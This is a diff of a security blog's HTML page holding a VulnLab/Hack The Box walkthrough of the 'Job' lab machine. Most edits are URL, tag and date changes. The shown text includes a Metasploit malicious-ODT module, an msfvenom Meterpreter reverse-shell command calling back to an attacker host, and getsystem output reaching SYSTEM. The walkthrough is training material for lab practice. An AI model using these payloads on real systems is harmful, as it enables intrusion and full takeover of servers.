@@ -6,32 +6,33 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Vulnlab Job: Exploiting Document Macros to Compromise Windows Web ServerIn this detailed VulnLab walkthrough of the “Job” machine, we demonstrate how an insecure resume submission process can lead to">
+    <meta name="description" content="Job: Exploiting Document Macros to Compromise Windows Web ServerIn this detailed VulnLab - Hack The Box walkthrough of the “Job” machine, we demonstrate how an insecure resume submission process can l">
 <meta property="og:type" content="article">
 <meta property="og:title" content="VL-Job">
-<meta property="og:url" content="https://panosoikogr.github.io/2025/04/02/VL-Job/index.html">
+<meta property="og:url" content="http://example.com/2025/04/02/VL-Job/index.html">
 <meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
-<meta property="og:description" content="Vulnlab Job: Exploiting Document Macros to Compromise Windows Web ServerIn this detailed VulnLab walkthrough of the “Job” machine, we demonstrate how an insecure resume submission process can lead to">
+<meta property="og:description" content="Job: Exploiting Document Macros to Compromise Windows Web ServerIn this detailed VulnLab - Hack The Box walkthrough of the “Job” machine, we demonstrate how an insecure resume submission process can l">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/foothold.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/macro1.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/macro2.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/marco3.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/macro4.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/marco4.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/hoaxhsell.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/dsvyper.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/shellback2.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/webshell.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/web-shell.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/impersonate.png">
-<meta property="og:image" content="https://panosoikogr.github.io/images/Job/mulit-handler.png">
-<meta property="article:published_time" content="2025-04-02T20:28:50.000Z">
-<meta property="article:modified_time" content="2025-05-21T06:38:34.660Z">
+<meta property="og:image" content="http://example.com/images/Job/foothold.png">
+<meta property="og:image" content="http://example.com/images/Job/macro1.png">
+<meta property="og:image" content="http://example.com/images/Job/macro2.png">
+<meta property="og:image" content="http://example.com/images/Job/marco3.png">
+<meta property="og:image" content="http://example.com/images/Job/macro4.png">
+<meta property="og:image" content="http://example.com/images/Job/marco4.png">
+<meta property="og:image" content="http://example.com/images/Job/hoaxhsell.png">
+<meta property="og:image" content="http://example.com/images/Job/dsvyper.png">
+<meta property="og:image" content="http://example.com/images/Job/shellback2.png">
+<meta property="og:image" content="http://example.com/images/Job/webshell.png">
+<meta property="og:image" content="http://example.com/images/Job/web-shell.png">
+<meta property="og:image" content="http://example.com/images/Job/impersonate.png">
+<meta property="og:image" content="http://example.com/images/Job/mulit-handler.png">
+<meta property="article:published_time" content="2025-04-02T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-13T10:35:49.999Z">
 <meta property="article:author" content="Panosoiko">
-<meta property="article:tag" content="VL">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="VulnLab">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://panosoikogr.github.io/images/Job/foothold.png">
+<meta name="twitter:image" content="http://example.com/images/Job/foothold.png">
     
     
       
@@ -41,12 +42,12 @@
       
       
         
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
         
       
       
         
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
         
       
     
@@ -78,7 +79,7 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 8.0.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -98,7 +99,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
@@ -124,24 +125,24 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/04/02/VL-Job/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&text=VL-Job"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&is_video=false&description=VL-Job"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=VL-Job&body=Check out this article: https://panosoikogr.github.io/2025/04/02/VL-Job/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&name=VL-Job&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/04/02/VL-Job/&t=VL-Job"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/02/VL-Job/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/02/VL-Job/&text=VL-Job"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/02/VL-Job/&is_video=false&description=VL-Job"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Job&body=Check out this article: http://example.com/2025/04/02/VL-Job/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/02/VL-Job/&name=VL-Job&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/02/VL-Job/&t=VL-Job"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Job-Exploiting-Document-Macros-to-Compromise-Windows-Web-Server"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab Job: Exploiting Document Macros to Compromise Windows Web Server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Discovery"><span class="toc-number">1.2.</span> <span class="toc-text">Vulnerability Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-Strategy"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access Strategy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Approach-Macro-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">Alternative Approach - Macro Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-a-Shell"><span class="toc-number">1.5.</span> <span class="toc-text">Getting a Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.6.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#System-Access"><span class="toc-number">1.7.</span> <span class="toc-text">System Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.8.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Job-Exploiting-Document-Macros-to-Compromise-Windows-Web-Server"><span class="toc-number">1.</span> <span class="toc-text">Job: Exploiting Document Macros to Compromise Windows Web Server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Discovery"><span class="toc-number">1.2.</span> <span class="toc-text">Vulnerability Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-Strategy"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access Strategy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Approach-Macro-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">Alternative Approach - Macro Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-a-Shell"><span class="toc-number">1.5.</span> <span class="toc-text">Getting a Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.6.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#System-Access"><span class="toc-number">1.7.</span> <span class="toc-text">System Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.8.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -166,7 +167,7 @@
       
     <div class="postdate">
       
-        <time datetime="2025-04-02T20:28:50.000Z" class="dt-published" itemprop="datePublished">2025-04-02</time>
+        <time datetime="2025-04-02T04:00:00.000Z" class="dt-published" itemprop="datePublished">2025-04-02</time>
         
       
     </div>
@@ -177,7 +178,7 @@
       
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+        <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>
     </div>
 
 
@@ -186,7 +187,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="Vulnlab-Job-Exploiting-Document-Macros-to-Compromise-Windows-Web-Server"><a href="#Vulnlab-Job-Exploiting-Document-Macros-to-Compromise-Windows-Web-Server" class="headerlink" title="Vulnlab Job: Exploiting Document Macros to Compromise Windows Web Server"></a>Vulnlab Job: Exploiting Document Macros to Compromise Windows Web Server</h1><p>In this detailed VulnLab walkthrough of the “Job” machine, we demonstrate how an insecure resume submission process can lead to full system compromise of a Windows-based web server. Starting with IIS short name vulnerability discovery, we leverage a job application portal’s request for LibreOffice documents to deliver malicious macros that establish initial access. The walkthrough progresses through lateral movement by exploiting developer group permissions to plant web shells, followed by service impersonation techniques for privilege escalation to SYSTEM. This step-by-step pentesting guide highlights the dangers of processing untrusted documents, insufficient application security controls, and improper service configurations in corporate environments.</p>
+    <h1 id="Job-Exploiting-Document-Macros-to-Compromise-Windows-Web-Server"><a href="#Job-Exploiting-Document-Macros-to-Compromise-Windows-Web-Server" class="headerlink" title="Job: Exploiting Document Macros to Compromise Windows Web Server"></a>Job: Exploiting Document Macros to Compromise Windows Web Server</h1><p>In this detailed VulnLab - Hack The Box walkthrough of the “Job” machine, we demonstrate how an insecure resume submission process can lead to full system compromise of a Windows-based web server. Starting with IIS short name vulnerability discovery, we leverage a job application portal’s request for LibreOffice documents to deliver malicious macros that establish initial access. The walkthrough progresses through lateral movement by exploiting developer group permissions to plant web shells, followed by service impersonation techniques for privilege escalation to SYSTEM. This step-by-step pentesting guide highlights the dangers of processing untrusted documents, insufficient application security controls, and improper service configurations in corporate environments.</p>
 <h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><p>Initial port scan revealed several open ports:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">25/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd</span><br><span class="line">| smtp-commands: JOB, SIZE 20480000, AUTH LOGIN, HELP</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Job.local</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br></pre></td></tr></table></figure>
 
@@ -196,7 +197,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Scanning...</span><br><span class="line"></span><br><span class="line">Testing request method: &quot;OPTIONS&quot; with magic part: &quot;/~1/.rem&quot; ...</span><br><span class="line">Early result: the target is probably vulnerable.</span><br><span class="line">Early result: identified letters in names &gt; A,D,E,H,I,L,N,O,P,S,T,X</span><br><span class="line">Early result: identified letters in extensions &gt; A,H,M,P,S,T</span><br><span class="line">File: HELLO~1.ASP</span><br><span class="line">Dir: ASPNET~1</span><br><span class="line">File: INDEX~1.HTM</span><br><span class="line">[\] INDEX~1.HTT</span><br><span class="line"># IIS Short Name (8.3) Scanner version 2023.4 - scan initiated 2025/04/02 17:40:37</span><br><span class="line">Target: http://10.10.94.31/</span><br><span class="line">|_ Result: Vulnerable!</span><br><span class="line">|_ Used HTTP method: OPTIONS</span><br><span class="line">|_ Suffix (magic part): /~1/.rem</span><br><span class="line">|_ Extra information:</span><br><span class="line">  |_ Number of sent requests: 444</span><br><span class="line">  |_ Identified directories: 1</span><br><span class="line">    |_ ASPNET~1</span><br><span class="line">  |_ Identified files: 2</span><br><span class="line">    |_ HELLO~1.ASP</span><br><span class="line">      |_ Actual file name = HELLO</span><br><span class="line">    |_ INDEX~1.HTM</span><br><span class="line">      |_ Actual file name = INDEX</span><br></pre></td></tr></table></figure>
 <p>Using the discovered information, I accessed the HELLO.ASPX file:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.94.31/HELLO.ASPX             </span><br><span class="line"></span><br><span class="line">&lt;html xmlns=&quot;www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;form method=&quot;post&quot; action=&quot;./HELLO.ASPX&quot; id=&quot;form1&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; id=&quot;__VIEWSTATE&quot; value=&quot;/wEPDwUKLTg0NTYxMzIxNWRksO0e53iBgOk1F32mZVsjTztyPJmhrJc1OInj8vzB5Gk=&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATEGENERATOR&quot; id=&quot;__VIEWSTATEGENERATOR&quot; value=&quot;D4124C05&quot; /&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line"></span><br><span class="line">        Hello World</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure>
-<p>I discovered a message on the website stating: “Please send your application to <a href="mailto:&#99;&#97;&#x72;&#101;&#x65;&#114;&#x40;&#x6a;&#x6f;&#x62;&#46;&#108;&#x6f;&#x63;&#x61;&#108;">&#99;&#97;&#x72;&#101;&#x65;&#114;&#x40;&#x6a;&#x6f;&#x62;&#46;&#108;&#x6f;&#x63;&#x61;&#108;</a>! We recently switched to using open source products - please send your cv as a libre office document.”</p>
+<p>I discovered a message on the website stating: “Please send your application to <a href="mailto:&#x63;&#x61;&#114;&#x65;&#x65;&#x72;&#64;&#x6a;&#x6f;&#x62;&#46;&#x6c;&#111;&#99;&#97;&#x6c;">career@job.local</a>! We recently switched to using open source products - please send your cv as a libre office document.”</p>
 <h2 id="Initial-Access-Strategy"><a href="#Initial-Access-Strategy" class="headerlink" title="Initial Access Strategy"></a>Initial Access Strategy</h2><p>This presented an opportunity for exploitation through malicious ODT files. I decided to use Metasploit’s ODT template:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use fileformat/odt_badodt</span><br></pre></td></tr></table></figure>
 <p>To capture hashes, I set up Responder:</p>
@@ -227,7 +228,7 @@
 <p>I pasted the HoaxShell command and got a new shell:<br><img src="/images/Job/impersonate.png" alt="Impersonating as web service"></p>
 <h2 id="System-Access"><a href="#System-Access" class="headerlink" title="System Access"></a>System Access</h2><p>For obtaining full system access, I generated a Meterpreter payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.5.195 LPORT=9091 -f exe -o shell2.exe</span><br></pre></td></tr></table></figure>
-<p>I uploaded the payload and set up a multi&#x2F;handler:<br><img src="/images/Job/mulit-handler.png" alt="Meterpreter multi/handler setup"><br>With the Meterpreter session established, I was able to escalate to SYSTEM:</p>
+<p>I uploaded the payload and set up a multi&#x2F;handler:<br><img src="/images/Job/mulit-handler.png" alt="Meterpreter multi&#x2F;handler setup"><br>With the Meterpreter session established, I was able to escalate to SYSTEM:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1828 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.20348.350]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot&gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The Job machine was successfully compromised by exploiting:</p>
@@ -258,7 +259,7 @@
         
           <li><a href="/search/">Search</a></li>
         
-          <li><a href="/tags/">Tags</a></li>
+          <li><a href="/tags/">tags</a></li>
         
           <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
         
@@ -268,23 +269,23 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnlab-Job-Exploiting-Document-Macros-to-Compromise-Windows-Web-Server"><span class="toc-number">1.</span> <span class="toc-text">Vulnlab Job: Exploiting Document Macros to Compromise Windows Web Server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Discovery"><span class="toc-number">1.2.</span> <span class="toc-text">Vulnerability Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-Strategy"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access Strategy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Approach-Macro-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">Alternative Approach - Macro Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-a-Shell"><span class="toc-number">1.5.</span> <span class="toc-text">Getting a Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.6.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#System-Access"><span class="toc-number">1.7.</span> <span class="toc-text">System Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.8.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Job-Exploiting-Document-Macros-to-Compromise-Windows-Web-Server"><span class="toc-number">1.</span> <span class="toc-text">Job: Exploiting Document Macros to Compromise Windows Web Server</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Discovery"><span class="toc-number">1.2.</span> <span class="toc-text">Vulnerability Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-Strategy"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access Strategy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Approach-Macro-Exploitation"><span class="toc-number">1.4.</span> <span class="toc-text">Alternative Approach - Macro Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-a-Shell"><span class="toc-number">1.5.</span> <span class="toc-text">Getting a Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.6.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#System-Access"><span class="toc-number">1.7.</span> <span class="toc-text">System Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.8.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
       </div>
     
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/04/02/VL-Job/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&text=VL-Job"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&is_video=false&description=VL-Job"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=VL-Job&body=Check out this article: https://panosoikogr.github.io/2025/04/02/VL-Job/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/04/02/VL-Job/&name=VL-Job&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/04/02/VL-Job/&t=VL-Job"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/02/VL-Job/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/02/VL-Job/&text=VL-Job"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/02/VL-Job/&title=VL-Job"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
